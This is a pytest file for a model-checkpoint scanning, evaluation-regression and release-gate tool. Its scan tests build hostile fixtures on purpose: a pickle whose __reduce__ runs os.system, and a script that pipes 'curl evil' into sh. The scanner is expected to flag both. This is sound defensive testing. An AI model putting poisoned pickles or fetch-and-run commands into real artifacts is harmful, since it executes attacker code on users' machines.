"""Phase 1 — free core: scan (integrity+backdoor), eval (+regression), gate."""

from __future__ import annotations

import pickle

import pytest

from soup_cli.passport import gate as gate_core
from soup_cli.passport.evaluation import builtin_suite, evaluate, load_suite, score_suite
from soup_cli.passport.scanning import scan_checkpoint

pytestmark = pytest.mark.unit


# --------------------------------------------------------------------------- #
# scan
# --------------------------------------------------------------------------- #
def test_scan_clean_safetensors(tmp_path):
    ckpt = tmp_path / "ckpt"
    ckpt.mkdir()
    (ckpt / "model.safetensors").write_bytes(b"tensors")
    (ckpt / "config.json").write_text("{}")
    result = scan_checkpoint(ckpt)
    assert result.is_clean
    assert result.integrity == "ok"
    assert result.artifact_hash and result.artifact_hash.startswith("sha256:")


def test_scan_flags_pickle_serialization(tmp_path):
    ckpt = tmp_path / "ckpt"
    ckpt.mkdir()
    (ckpt / "pytorch_model.bin").write_bytes(pickle.dumps({"w": [1, 2, 3]}))
    result = scan_checkpoint(ckpt)
    assert not result.is_clean  # unsafe serialization is at least a warning
    assert any(f.code == "unsafe-serialization" for f in result.findings)


def test_scan_detects_poisoned_pickle(tmp_path):
    import os

    class Exploit:
        def __reduce__(self):
            return (os.system, ("echo pwned",))

    ckpt = tmp_path / "ckpt"
    ckpt.mkdir()
    with open(ckpt / "pytorch_model.bin", "wb") as fh:
        pickle.dump(Exploit(), fh)
    result = scan_checkpoint(ckpt)
    assert not result.is_clean
    assert result.integrity == "failed"
    assert any(f.code == "pickle-dangerous-global" for f in result.findings)


def test_scan_flags_executable_in_checkpoint(tmp_path):
    ckpt = tmp_path / "ckpt"
    ckpt.mkdir()
    (ckpt / "model.safetensors").write_bytes(b"tensors")
    (ckpt / "run.sh").write_text("#!/bin/sh\ncurl evil | sh\n")
    result = scan_checkpoint(ckpt)
    assert not result.is_clean
    assert any(f.code == "executable-in-checkpoint" for f in result.findings)


def test_scan_missing_path_raises(tmp_path):
    with pytest.raises(FileNotFoundError):
        scan_checkpoint(tmp_path / "nope")


# --------------------------------------------------------------------------- #
# eval
# --------------------------------------------------------------------------- #
def test_builtin_suite_scoring_perfect():
    suite = builtin_suite("smoke")
    preds = [it.expected for it in suite.items]
    scores = score_suite(suite, preds)
    for task in scores.values():
        assert task["score"] == 1.0


def test_eval_regression_flagged():
    suite = builtin_suite("smoke")
    good = [it.expected for it in suite.items]
    # Baseline: perfect. After: arithmetic wrong.
    import json

    baseline_scores = score_suite(suite, good)
    scores_block = {t: {"after": s["score"]} for t, s in baseline_scores.items()}
    baseline_passport = {"blocks": {"evaluation": {"scores": scores_block}}}
    import os
    import tempfile

    fd, path = tempfile.mkstemp(suffix=".json")
    with os.fdopen(fd, "w") as fh:
        json.dump(baseline_passport, fh)

    after = list(good)
    # break arithmetic (items index 2,3 are arithmetic)
    after[2] = "wrong"
    after[3] = "wrong"
    result = evaluate(suite, after, baseline=path)
    os.unlink(path)
    assert result.has_regressions
    assert result.scores["arithmetic"]["regression"] is True
    assert result.scores["arithmetic"]["delta"] < 0


def test_eval_no_baseline_no_regression():
    suite = builtin_suite("smoke")
    preds = [it.expected for it in suite.items]
    result = evaluate(suite, preds)
    assert not result.has_regressions
    for s in result.scores.values():
        assert s["before"] is None


def test_load_suite_from_jsonl(tmp_path):
    p = tmp_path / "suite.jsonl"
    p.write_text(
        '{"prompt": "hi", "expected": "hello", "metric": "contains", "task": "t"}\n'
    )
    suite = load_suite(str(p))
    assert len(suite.items) == 1
    assert suite.items[0].task == "t"


# --------------------------------------------------------------------------- #
# gate
# --------------------------------------------------------------------------- #
def test_gate_ship_when_rules_pass():
    eval_json = {"scores": {"arithmetic": {"after": 0.9, "regression": False}}}
    rules = gate_core.GateRules(min_scores={"arithmetic": 0.8})
    result = gate_core.evaluate_gate(eval_json, None, rules)
    assert result.ship
    assert result.exit_code == 0


def test_gate_dont_ship_below_min_score():
    eval_json = {"scores": {"arithmetic": {"after": 0.5}}}
    rules = gate_core.GateRules(min_scores={"arithmetic": 0.8})
    result = gate_core.evaluate_gate(eval_json, None, rules)
    assert not result.ship
    assert result.exit_code == 4
    assert any("min-score" in r for r in result.reasons)


def test_gate_dont_ship_on_regression():
    eval_json = {"scores": {"t": {"after": 0.5, "regression": True, "delta": -0.2}}}
    rules = gate_core.GateRules(no_regressions=True)
    result = gate_core.evaluate_gate(eval_json, None, rules)
    assert not result.ship


def test_gate_requires_clean_scan():
    eval_json = {"scores": {}}
    scan_json = {"status": "flagged", "integrity": "failed"}
    rules = gate_core.GateRules(require_clean_scan=True)
    result = gate_core.evaluate_gate(eval_json, scan_json, rules)
    assert not result.ship
    assert any("require-clean-scan" in r for r in result.reasons)


def test_gate_missing_evidence_is_dont_ship():
    rules = gate_core.GateRules(require_clean_scan=True)
    result = gate_core.evaluate_gate(None, None, rules)
    assert not result.ship


def test_parse_min_score():
    assert gate_core.parse_min_score(["a=0.8", "b=0.5"]) == {"a": 0.8, "b": 0.5}
    with pytest.raises(ValueError):
        gate_core.parse_min_score(["bad"])
